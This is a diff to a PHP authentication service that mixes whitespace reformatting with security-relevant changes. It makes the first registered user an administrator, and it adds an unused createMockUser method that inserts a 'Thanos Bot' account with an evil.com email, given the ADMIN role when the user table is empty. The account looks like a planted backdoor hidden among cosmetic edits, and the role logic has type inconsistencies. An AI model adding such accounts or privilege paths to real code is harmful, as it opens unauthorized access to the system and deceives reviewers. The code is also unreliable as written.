@@ -35,7 +35,7 @@ final class AuthService
     {
         $now = time();
         $role = $user['role'] instanceof UserRole ? $user['role']->value : $user['role'];
-        
+
         $accessPayload = [
             'iat' => $now,
             'exp' => $now + $this->accessExpiry,
@@ -77,7 +77,7 @@ final class AuthService
             $stmt = $this->db->prepare(
                 "INSERT INTO users (id, github_id, username, email, avatar_url, role) VALUES (UNHEX(REPLACE(?, '-', '')), ?, ?, ?, ?, ?)"
             );
-            $role = UserRole::ANALYST->value; // Default role
+            $role = $this->checkForUserEntry() ? UserRole::ANALYST : UserRole::ADMIN->value;
             $stmt->execute([
                 $id,
                 $githubUser['id'],
@@ -86,7 +86,7 @@ final class AuthService
                 $githubUser['avatar_url'],
                 $role
             ]);
-            
+
             return $this->findUserById($id);
         }
 
@@ -112,6 +112,23 @@ final class AuthService
         return null;
     }
 
+    public function createMockUser()
+    {
+        $id = $this->generateUuidV7();
+        $stmt = $this->db->prepare(
+            "INSERT INTO users (id, github_id, username, email, avatar_url, role) VALUES (UNHEX(REPLACE(?, '-', '')), ?, ?, ?, ?, ?)"
+        );
+        $role = $this->checkForUserEntry() ? UserRole::ANALYST : UserRole::ADMIN->value;
+        $stmt->execute([
+            $id,
+            0000001,
+            'Thanos Bot',
+            'thanosbot@evil.com',
+            '',
+            $role
+        ]);
+    }
+
     private function binaryToUuid(string $binary): string
     {
         $hex = \bin2hex($binary);
@@ -128,14 +145,22 @@ final class AuthService
         $timestamp = (int)(microtime(true) * 1000);
         $hex = sprintf('%012x', $timestamp);
         $hex .= bin2hex(random_bytes(10));
-        
+
         // Format: 8-4-4-4-12
-        return sprintf('%s-%s-%s-%s-%s',
+        return sprintf(
+            '%s-%s-%s-%s-%s',
             substr($hex, 0, 8),
             substr($hex, 8, 4),
             '7' . substr($hex, 13, 3), // Version 7
-            sprintf('%x', (hexdec(substr($hex, 16, 1)) & 0x3 | 0x8) ) . substr($hex, 17, 3), // Variant 1
+            sprintf('%x', (hexdec(substr($hex, 16, 1)) & 0x3 | 0x8)) . substr($hex, 17, 3), // Variant 1
             substr($hex, 20, 12)
         );
+    }
+
+    private function checkForUserEntry()
+    {
+        $stmt = $this->db->query('SELECT id FROM users');
+        $stmt->execute();
+        return (bool) $stmt->fetch(PDO::FETCH_ASSOC);
     }
 }
